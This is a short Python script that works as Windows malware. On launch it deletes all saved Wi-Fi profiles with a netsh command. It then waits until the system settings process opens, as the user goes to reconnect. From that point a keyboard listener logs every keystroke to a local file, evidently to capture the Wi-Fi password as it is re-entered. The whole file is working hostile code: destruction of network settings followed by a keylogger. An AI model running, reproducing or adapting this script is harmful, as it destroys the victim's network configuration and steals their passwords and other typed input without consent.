# import moudulues
import psutil
import os
import time
from pynput.keyboard import Listener
from colorama import init, Fore
init()


# writing keys

def key(a_key) -> None:
    print(a_key)
    f = open('logs.txt', 'a')
    f.write(str(a_key) + '\n')

# deleting all wifis

def delete_wifi() -> None:
    os.system('netsh wlan delete all profiles name=* i=*')


# getting process ides

def get_pides() -> list:
    pides = psutil.pids()


    return pides

# getting process names

def get_process_names(pids_list: list) -> list:
    process_names = []

    for proc in psutil.process_iter():
        process_names.append(proc.name())

    return process_names

# find a process

# deleting wifi

delete_wifi()

time.sleep(7)

def find_process(name: str, process_list: list) -> bool:

    for process in process_list:
        # serching in the list
        if process == name:
            return True

        
    return False


# waiting to user open the cmd or settings


while True:
    
    if find_process('SystemSettings.exe' ,get_process_names(get_pides())):
        print(Fore.GREEN + '[+] user is connecting to wifi!!')
        break
    else:
        time.sleep(5)
        print(Fore.RED + '[-] waiting...')

# starting listening with keyboard

listen = Listener(on_press=key)

listen.start()


while True:
    pass















